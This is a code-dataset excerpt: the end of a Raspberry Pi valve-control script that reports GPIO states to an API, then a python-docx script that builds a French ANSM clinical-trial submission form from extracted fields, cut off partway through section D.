str(GPIO.input(V1_ZARVA))\n     + \",G13:\" + str(GPIO.input(V1_NYITVA))\n     + \",G12:\" + str(GPIO.input(V3_ZARVA))\n     + \",G6:\" + str(GPIO.input(V3_NYITVA))\n     + \",G27:\" + g27Value\n     + \",G25:\" + g25Value )\n\ndef resetSignalTorlese():\n    requests.post(apiService, data={'action': 8})\n    return 1\n\ndef asyncSleep(ido):\n    t = ido\n    while t > 0:\n        time.sleep(1)\n        if (t % 8) == 0:\n            allapotTarolas(allapotUzenetLetrehozasa())\n        t = t - 1\n    return 1\n\nprint \"A program elindult\"\ninit()\nboot = 1\nmaster = '-1'\n\nfor arg in sys.argv:\n    if arg == '-w':\n        boot = 0\n        master = '0'\n\nwhile True:\n    if master == '-1':\n        master = bejelentkezes()\n\n    if boot == 1 and master == '0' :\n        requests.post(apiService, data={'action': 17})\n        uzemAllapotBeallitas()\n        resetSignalTorlese()\n\n    if boot != 1 and master == '0' :\n        #print 'allapotTarolas';\n        allapotTarolas(allapotUzenetLetrehozasa())\n        #print 'utasitasLekerdezes';\n        utasitas = int(utasitasLekerdezes())\n        if utasitas == 1 :\n            uzemAllapotBeallitas()\n        elif utasitas == 2 :\n            zartAllapotBeallitas()\n        elif utasitas == 4 :\n            savazoAllapotBeallitas()\n        elif utasitas >= 30 and utasitas <= 37 :\n            szelepVezerles(utasitas)\n            \n    print \"\"\n    time.sleep(10)\n"}
{"blob_id": "81fe74683d43eceb3768c80a2e77c4a01a16c780", "directory_id": "73f5e6f3ea58db803758ab52f2430395926a5e87", "path": "/ansm_medoc.py", "content_id": "bedaf679fed987b287b311f94f4229707ab90f30", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "RomainLagrange/ProjetAnnuel", "snapshot_id": "21002468f19b6efa9f48aa0190bfbfd7ab01d909", "revision_id": "538cba81e75865a7831bd12eee18728e0cd90ad0", "branch_name": "refs/heads/master", "visit_date": "2020-04-07 20:59:46.768572", "revision_date": "2019-05-26 13:13:15", "committer_date": "2019-05-26 13:13:15", "github_id": "158710355", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2018-11-29 13:10:01", "gha_created_at": "2018-11-22 14:23:41", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "77184", "extension": "py", "content": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Mar  4 22:56:32 2019\n\n@author: Marion\n\"\"\"\n\n\n#import pandas as pd\nimport docx\nfrom docx.api import Document\nfrom docx.enum.text import WD_ALIGN_PARAGRAPH\nfrom docx.shared import Cm\nfrom docx.enum.style import WD_STYLE_TYPE\nfrom docx.shared import Inches, Pt, RGBColor\nfrom docx.oxml.ns import nsdecls, qn\nfrom docx.oxml import parse_xml\nfrom docx.oxml import OxmlElement\nimport time\nfrom time import gmtime, strftime\nimport os\nfrom os import sys\n\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n\n    return os.path.join(base_path, relative_path)\n\n\ndef main_ansm_medoc(extract):\n     document = docx.Document()\n     partie_A_B(document, extract)\n     partie_C(document, extract)\n     Partie_D(document, extract)\n     Partie_E(document, extract)\n     Partie_F_G(document, extract)\n     Partie_H_I(document, extract)\n     date = (strftime('%d-%m-%Y',time.localtime()))\n     document.save(\"soumission_ansm_medicament_\"+extract['titre_abrege']+\"_\"+date+\".docx\")\n\ndef partie_A_B(document, extract):\n    \n    '''Marge de la page'''\n    sections = document.sections\n    for section in sections:\n        section.top_margin = Cm(1.2)\n        section.bottom_margin = Cm(1)\n        section.left_margin = Cm(1.8)\n        section.right_margin = Cm(1.8)\n        \n    '''Introduction'''\n    table = document.add_table(rows=1, cols=6, style='Table Grid')\n    cell=table.cell(0,0)\n    paragraph = cell.paragraphs[0]\n    ca = paragraph.add_run()\n    ca.add_picture(resource_path('ansm.jpg'))\n    table.cell(0,1).text=(\"Formulaire de demande d\u2019autorisation aupr\u00e8s de l\u2019ANSM et de demande d\u2019avis \u00e0 un Comit\u00e9 de protection des personnes d'une recherche mentionn\u00e9e au 1\u00b0 de l\u2019article L. 1121-1 du code de la sant\u00e9 publique portant sur un m\u00e9dicament \u00e0 usage humain \")\n    table.cell(0,5).text=(\"FAEC\")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.bold = True\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(11)\n    a=table.cell(0,1)\n    b=table.cell(0,4)\n    a.merge(b)\n    \n    styles= document.styles\n    style=styles.add_style('debut_page', WD_STYLE_TYPE.PARAGRAPH)\n    paragraph_format = style.paragraph_format\n    paragraph_format.space_before\n    paragraph_format.space_after\n    fontdebut = style.font\n    fontdebut.name = 'Arial'\n    fontdebut.bold = True\n    fontdebut.size = docx.shared.Pt(10) \n    \n    paragraph=document.add_paragraph(\"\\nPARTIE A COMPLETER PAR L\u2019ANSM / LE COMITE DE PROTECTION DES PERSONNES (CPP)\\n\", style='debut_page')\n    \n    table = document.add_table(rows=7, cols=3, style='Table Grid')\n    table.cell(0,0).text=(\"Date de r\u00e9ception de la demande :     \\n\"\n                          \"Date de demande d\u2019information pour validation :      \")\n    table.cell(0,1).text=(\"Date de demande d\u2019informations compl\u00e9mentaires :      \")\n    table.cell(0,2).text=(\"Refus d\u2019autorisation / avis d\u00e9favorable :    \u25a1\\nDate :      \")\n    table.cell(5,0).text=(\"Date d\u2019enregistrement du dossier complet :      \\nDate du d\u00e9but d'\u00e9valuation :      \")\n    table.cell(5,1).text=(\"Date de r\u00e9ception des informations compl\u00e9mentaires / amend\u00e9es :      \")\n    table.cell(5,2).text=(\"Autorisation / avis favorable :      \u25a1\\nDate :      \")\n    table.cell(6,0).text=(\"R\u00e9f\u00e9rence attribu\u00e9e par l'ANSM :      \\nR\u00e9f\u00e9rence attribu\u00e9e par le CPP :      \")\n    table.cell(6,1).text=(\"Retrait de la demande    \u25a1\\nDate :      \")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n    a=table.cell(6,1)\n    b=table.cell(6,2)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    sentence=paragraph.add_run(\"\\nPARTIE A COMPLETER PAR LE DEMANDEUR\\n\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.bold = True\n    fontdebut.size = docx.shared.Pt(10)\n    sentence=paragraph.add_run(\"Ce formulaire est destin\u00e9 \u00e0 la fois \u00e0 la demande d\u2019autorisation aupr\u00e8s de l\u2019ANSM et \u00e0 la demande d\u2019avis au comit\u00e9 de protection des personnes (CPP). Veuillez cocher ci-apr\u00e8s la case correspondant \u00e0 l\u2019objet de la demande.\\n\\n\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.size = docx.shared.Pt(10)\n    sentence=paragraph.add_run(\"\\nDEMANDE D\u2019AUTORISATION \u00c0 L\u2019ANSM : \t                                                                         \u25a1\\n\"\n                               \"DEMANDE D\u2019AVIS AU CPP\t                                                                                                   \u25a1\\n\"\n                               \"\\nA. IDENTIFICATION DE L\u2019ESSAI CLINIQUE\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.size = docx.shared.Pt(10)\n    \n    table = document.add_table(rows=1, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"A.1 Etat membre dans lequel la demande est soumise : FRANCE\\n\"\n                          \"A.2 Num\u00e9ro EudraCT  :  \"+extract['num_eudract']+\"    \\n\"\n                          \"A.3 Titre complet de l\u2019essai clinique :  \"+extract['titre_complet']+\"    \\n\"\n                          \"A.4 Num\u00e9ro de code du protocole de l\u2019essai attribu\u00e9 par le promoteur, version et date  :   \"+extract['code_protocole']+\"   \\n\"\n                          \"A.5 Nom ou titre abr\u00e9g\u00e9 de l\u2019essai, le cas \u00e9ch\u00e9ant :  \"+extract['titre_abrege']+\"    \\n\"\n                          \"A.6 Num\u00e9rotation ISRCTN , le cas \u00e9ch\u00e9ant :      \\n\"\n                          \"A.7 S'agit-il d'une resoumission de la demande ?  \u25a1 oui  \u25a1 non  Si oui, indiquer la lettre de resoumission  :      \")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n    \n    '''Partie B'''\n    paragraph=document.add_paragraph(\"\\nB. IDENTIFICATION DU PROMOTEUR RESPONSABLE DE LA DEMANDE\", style='debut_page')\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"B.1\tPromoteur \")\n    table.cell(1,0).text=(\"B.1.1\tOrganisme :  \"+extract['promoteur_nom_organisme']+\"    \\n\"\n                          \"B.1.2\tNom de la personne \u00e0 contacter :  \"+extract['promoteur_nom_personne_contact']+\"   \\n\" \n                          \"B.1.3\tAdresse :  \"+extract['promoteur_adresse']+\"   \\n\" \n                          \"B.1.4\tNum\u00e9ro de t\u00e9l\u00e9phone : \"+extract['promoteur_num_telephone']+\"     \\n\"\n                          \"B.1.5\tNum\u00e9ro de t\u00e9l\u00e9copie : \"+extract['promoteur_num_telecopie']+\"   \\n\"  \n                          \"B.1.6\tM\u00e9l :  \"+extract['promoteur_courriel']+\"    \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"B.2 Repr\u00e9sentant l\u00e9gal  du promoteur dans l\u2019Union europ\u00e9enne pour l\u2019essai concern\u00e9\")\n    table.cell(1,0).text=(\"B.2.1\tOrganisme :  \"+extract['promoteur_UE_nom_organisme']+\"    \\n\"\n                          \"B.2.2\tNom de la personne \u00e0 contacter : \"+extract['promoteur_UE_nom_personne_contact']+\"   \\n\"  \n                          \"B.2.3\tAdresse :  \"+extract['promoteur_UE_adresse']+\"    \\n\"\n                          \"B.2.4\tNum\u00e9ro de t\u00e9l\u00e9phone : \"+extract['promoteur_UE_num_telephone']+\" \\n\"    \n                          \"B.2.5\tNum\u00e9ro de t\u00e9l\u00e9copie : \"+extract['promoteur_UE_num_telecopie']+\"  \\n\"   \n                          \"B.2.6\tMail :  \"+extract['promoteur_UE_courriel']+\"    \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"B.3 Statut du promoteur\")\n    table.cell(1,0).text=(\"B.3.1    Priv\u00e9 (commercial)                                                                      \t\u25a1\\n\"\n                          \"B.3.2    Institutionnel  (non commercial)                                              \t\u25a1\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    \ndef partie_C(document, extract):\n    \n    '''Partie C'''\n    paragraph=document.add_paragraph(\"\\nC. IDENTIFICATION DU DEMANDEUR (cocher les cases appropri\u00e9es)\\n\", style='debut_page')\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"C.1\tDemande aupr\u00e8s de l\u2019ANSM\t                                                                      \u25a1\")\n    table.cell(1,0).text=(\"C.1.1       Promoteur                                                                                                                   \u25a1\\n\"\n                          \"C.1.2       Repr\u00e9sentant l\u00e9gal du promoteur                                                                               \u25a1\\n\"\n                          \"C.1.3\tPersonne ou organisme d\u00e9l\u00e9gu\u00e9 par le promoteur pour soumettre la demande\t     \u25a1\\n\"\n                          \"C.1.4 \tPr\u00e9ciser ci-apr\u00e8s les informations relatives au demandeur, m\u00eame si elles figurent ailleurs dans le formulaire : Si promoteur, partie B1, si repr\u00e9sentant l\u00e9gal du promoteur, partie B2\\n\"\n                          \"C.1.4.1 \tOrganisme :  \"+extract['demandeur_nom_organisme']+\"    \\n\"\n                          \"C.1.4.2 \tNom de la personne \u00e0 contacter :  \"+extract['demandeur_nom_personne_contact']+\"    \\n\"\n                          \"C.1.4.3 \tAdresse :  \"+extract['demandeur_UE_adresse']+\"    \\n\"\n                          \"C.1.4.4 \tNum\u00e9ro de t\u00e9l\u00e9phone :  \"+extract['demandeur_UE_num_telephone']+\"    \\n\"\n                          \"C.1.4.5 \tNum\u00e9ro de t\u00e9l\u00e9copie :  \"+extract['demandeur_UE_num_telecopie']+\"    \\n\"\n                          \"C.1.4.6\tMail :  \"+extract['demandeur_UE_courriel']+\"    \\n\"\n                          \"C.1.5 Demande d'envoi d'une copie des donn\u00e9es du formulaire sous format xml :\\n\"\n                          \"C.1.5.1 Souhaitez-vous recevoir une copie du fichier xml des donn\u00e9es du formulaire sauvegard\u00e9es sur la base EudraCT ?\t\u25a1 oui    \u25a1 non \\n\"\n                          \"C.1.5.1.1 Si oui, indiquer les adresses m\u00e9l auxquelles cette copie doit \u00eatre adress\u00e9e (5 adresses maximum) :      \\n\"\n                          \"C.1.5.1.2 Souhaitez-vous que cet envoi soit s\u00e9curis\u00e9  ?\t\u25a1 oui    \u25a1 non\\n\"\n                          \"Si non \u00e0 la question C.1.5.1.2, le fichier xml vous sera transmis par courrier \u00e9lectronique non s\u00e9curis\u00e9.\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"C.2\tDEMANDE AUPR\u00c8S DU CPP                                                                                      \u25a1\")\n    table.cell(1,0).text=(\"C.2.1       Promoteur                                                                                                                   \u25a1\\n\"\n                          \"C.2.2       Repr\u00e9sentant l\u00e9gal du promoteur                                                                               \u25a1\\n\"\n                          \"C.2.3\tPersonne ou organisme d\u00e9l\u00e9gu\u00e9 par le promoteur pour soumettre la demande\t     \u25a1\\n\"\n                          \"C.2.4 Investigateur charg\u00e9 de soumettre la demande, si applicable  :\\n\"\n                          \"\u2022\tInvestigateur coordonnateur (en cas d'essai multicentrique)\t           \u25a1\\n\"\n                          \"\u2022\tInvestigateur principal (en cas d'essai monocentrique)\t               \u25a1\\n\"\n                          \"C.2.5 \tPr\u00e9ciser ci-apr\u00e8s les informations relatives au demandeur, m\u00eame si elles figurent ailleurs dans le formulaire : Si promoteur, partie B1, si repr\u00e9sentant l\u00e9gal du promoteur, partie B2\\n\"\n                          \"C.2.5.1\tOrganisme :      \\n\"\n                          \"C.2.5.2\tNom de la personne \u00e0 contacter :      \\n\"\n                          \"C.2.5.3\tAdresse :      \\n\"\n                          \"C.2.5.4\tNum\u00e9ro de t\u00e9l\u00e9phone :      \\n\"\n                          \"C.2.5.5\tNum\u00e9ro de t\u00e9l\u00e9copie : \\n\"     \n                          \"C.2.5.6\tM\u00e9l :      \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \ndef Partie_D(document, extract):\n    \n    '''Partie D'''\n    paragraph=document.add_paragraph(\"\\nD. DONNEES RELATIVES A CHAQUE MEDICAMENT EXPERIMENTAL\", style='debut_page')\n    paragraph=document.add_paragraph()\n    sentence=paragraph.add_run(\"Les informations concernant chaque 'produit vrac' [c\u2019est-\u00e0-dire avant toute op\u00e9ration pharmaceutique sp\u00e9cifique \u00e0 l\u2019essai (mise en insu, conditionnement et \u00e9tiquetage)], doivent \u00eatre indiqu\u00e9es dans cette section, pour chaque m\u00e9dicament exp\u00e9rimental (ME) \u00e9tudi\u00e9, y compris pour chaque m\u00e9dicament utilis\u00e9 comme comparateur et pour chaque placebo, le cas \u00e9ch\u00e9ant. Si l\u2019essai clinique porte sur plusieurs ME, r\u00e9p\u00e9ter cette section, en attribuant \u00e0 chaque ME un num\u00e9ro d\u2019ordre \u00e0 l'item D.1.1. Si le m\u00e9dicament est une association, les informations doivent \u00eatre donn\u00e9es pour chaque substance active concern\u00e9e.\\n\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.size = docx.shared.Pt(10)\n    \n    table = document.add_table(rows=4, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"D.1\t IDENTIFICATION DU MEDICAMENT EXPERIMENTAL\")\n    table.cell(1,0).text=(\"Indiquer ci-dessous quel ME est d\u00e9crit dans cette section D. Le cas \u00e9ch\u00e9ant, r\u00e9p\u00e9ter cette section autant de fois qu'il y a de ME utilis\u00e9 dans l\u2019essai (num\u00e9roter chaque ME de 1 \u00e0 n)\")\n    table.cell(2,0).text=(\"D.1.1         Cette section concerne le ME num\u00e9ro :\t     \\n\"\n                          \"D.1.2         ME \u00e9tudi\u00e9                                                                       \t\u25a1\\n\"\n                          \"D.1.3         ME utilis\u00e9 comme comparateur                                   \t\u25a1\")\n    table.cell(3,0).text=(\"Pour le placebo, aller directement en section D.7\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,0)\n    a.merge(b)\n    a=table.cell(2,0)\n    b=table.cell(3,0)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    '''Partie D2'''\n    \n    table = document.add_table(rows=12, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2\t   STATUT DU PRODUIT SUR LEQUEL PORTE LA RECHERCHE \")\n    table.cell(1,0).text=(\"Si le ME dispose d'une AMM en France, mais que le nom de la sp\u00e9cialit\u00e9 et le titulaire de l\u2019AMM ne sont pas d\u00e9termin\u00e9s dans le protocole de l'essai, aller \u00e0 la section D.2.2.\")\n    table.cell(2,0).text=(\"D.2.1\t   Le ME utilis\u00e9 dans l\u2019essai dispose-t-il d'une AMM ?\")\n    table.cell(3,0).text=(\"D.2.1.1\t   Si oui en D.2.1, pr\u00e9ciser pour le m\u00e9dicament utilis\u00e9 dans l'essai :\")\n    table.cell(4,0).text=(\"D.2.1.1.1    Nom de sp\u00e9cialit\u00e9  :      \")\n    table.cell(5,0).text=(\"D.2.1.1.2    Nom du titulaire de l\u2019AMM :      \")\n    table.cell(6,0).text=(\"D.2.1.1.3    Num\u00e9ro d\u2019AMM (si AMM d\u00e9livr\u00e9e par un Etat membre) :      \")\n    table.cell(7,0).text=(\"D.2.1.1.4    Le ME est-il modifi\u00e9 par rapport \u00e0 son AMM ?\")\n    table.cell(8,0).text=(\"D.2.1.1.4.1 Si oui, veuillez pr\u00e9ciser :      \")\n    table.cell(9,0).text=(\"D.2.1.2       Quel pays a d\u00e9livr\u00e9 l'AMM ?      \")\n    table.cell(10,0).text=(\"D.2.1.2.1    Est-ce la France ?\")\n    table.cell(11,0).text=(\"D.2.1.2.2    Est-ce un autre Etat membre ?\")\n    \n    for i in range(1,12):\n        if i==2 or i==7 or i==10 or i==11:\n            table.cell(i,5).text=(\"\u25a1 oui  \u25a1 non\")\n        else:\n            table.cell(i,5).text=(\" \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==4 or n==14 or n==20 or n==22:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==3:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,5)\n    a.merge(b)\n    a=table.cell(2,0)\n    b=table.cell(11,4)\n    a.merge(b)\n    a=table.cell(2,5)\n    b=table.cell(11,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=5, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2.2\tCas o\u00f9 le ME utilis\u00e9 dans l\u2019essai clinique dispose d'une AMM en France, mais le protocole autorise l\u2019utilisation de toute sp\u00e9cialit\u00e9 pour le ME, sous r\u00e9serve qu\u2019elle dispose d'une AMM en France, et il n\u2019est donc pas possible d\u2019identifier pr\u00e9cis\u00e9ment le/les ME avant le d\u00e9but de l\u2019essai\")\n    table.cell(1,0).text=(\"D.2.2.1      Dans le protocole, le traitement est-il d\u00e9fini uniquement par la substance active ?\\n\"\n                          \"D.2.2.1.1 Si oui, indiquer le nom de la substance active en D.3.8 ou D.3.9\")\n    table.cell(2,0).text=(\"D.2.2.2      Dans le protocole, les sch\u00e9mas de traitement permettent-ils diff\u00e9rentes combinaisons de m\u00e9dicaments commercialis\u00e9s, utilis\u00e9s selon les pratiques cliniques locales dans certains ou dans tous les lieux de recherche en France ?\\n\"\n                          \"D.2.2.2.1 Si oui, indiquer le nom de la substance active en D.3.8 ou D.3.9\")\n    table.cell(3,0).text=(\"D.2.2.3      Les produits \u00e0 administrer en tant que ME sont-ils d\u00e9finis comme appartenant \u00e0 un groupe ATC ?\\n\"\n                          \"D.2.2.3.1 Si oui, indiquer ce groupe ATC dans le champ des codes ATC (niveau 3 ou plus jusqu\u2019au niveau pouvant \u00eatre d\u00e9fini) de la section D.3.3\")\n    table.cell(4,0).text=(\"D.2.2.4      Autre :\\n\"\n                          \"D.2.2.4.1 Si oui, veuillez pr\u00e9ciser :      \")\n    table.cell(0,5).text=(\" \")\n    table.cell(1,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(2,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(3,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(4,5).text=(\"\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==3 or n==5 or n==7 or n==9:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    for i in range (1,5) :\n        a=table.cell(i,0)\n        b=table.cell(i,4)\n        a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=4, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2.3\tDossier du m\u00e9dicament exp\u00e9rimental soumis (DME)\")\n    table.cell(1,0).text=(\"D.2.3.1\tDME complet\")\n    table.cell(2,0).text=(\"D.2.3.2\tDME simplifi\u00e9\")\n    table.cell(3,0).text=(\"D.2.3.3\tR\u00e9sum\u00e9 des caract\u00e9ristiques du produit (RCP) uniquement\")\n    table.cell(1,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(2,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(3,5).text=(\"\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2 or n==4 or n==6:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(3,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(3,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2.4\tL\u2019utilisation du ME a-t-elle d\u00e9j\u00e0 \u00e9t\u00e9 autoris\u00e9e dans le cadre d'un essai clinique pr\u00e9c\u00e9dent conduit par le promoteur dans la Communaut\u00e9 europ\u00e9enne ?\")\n    table.cell(1,0).text=(\"D.2.4.1\tSi oui, pr\u00e9ciser dans quel(s) Etat(s) membre(s) :      \")\n    table.cell(0,5).text=(\"\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==1:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(1,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2.5    Le ME est-il d\u00e9sign\u00e9, dans l\u2019indication \u00e9tudi\u00e9e dans l'essai, comme un m\u00e9dicament orphelin dans la Communaut\u00e9 europ\u00e9enne ?\")\n    table.cell(1,0).text=(\"D.2.5.1\tSi oui, indiquer le num\u00e9ro de d\u00e9signation du m\u00e9dicament orphelin  :      \")\n    table.cell(0,5).text=(\"\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==1:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(1,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=3, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.2.6    Un avis scientifique a-t-il \u00e9t\u00e9 rendu sur le ME dans le cadre de cet essai clinique ?\")\n    table.cell(1,0).text=(\"D.2.6.1\tSi oui en D.2.6, veuillez pr\u00e9ciser qui a rendu l'avis et en joindre une copie \u00e0 votre dossier :\")\n    table.cell(2,0).text=(\"D.2.6.1.1    Avis du CHMP  ?\\n\"\n                          \"D.2.6.1.2\tAvis d'une autorit\u00e9 comp\u00e9tente d'un Etat membre ?\")\n    table.cell(0,5).text=(\"\u25a1 oui  \u25a1 non\")\n    table.cell(2,5).text=(\"\\n\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==1 or n==4:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(2,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    '''Partie D3'''\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=3, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"D.3\t DESCRIPTION DU MEDICAMENT EXPERIMENTAL\")\n    table.cell(1,0).text=(\"D.3.1         Nom du ME, le cas \u00e9ch\u00e9ant  :      \\n\"\n                          \"D.3.2         Nom de code, le cas \u00e9ch\u00e9ant  :      \\n\"\n                          \"D.3.3         Code ATC, si enregistr\u00e9 officiellement :      \\n\"\n                          \"D.3.4         Forme pharmaceutique (utiliser les termes standard) :      \\n\"\n                          \"D.3.5         Dur\u00e9e maximale du traitement pour une personne pr\u00e9vue par le protocole :      \\n\"\n                          \"D.3.6         Dose maximale permise (pr\u00e9ciser : dose journali\u00e8re ou dose cumul\u00e9e ; unit\u00e9s et voie d'administration) :      \\n\"\n                          \"D.3.7         Voie d\u2019administration (utiliser les termes standard) :      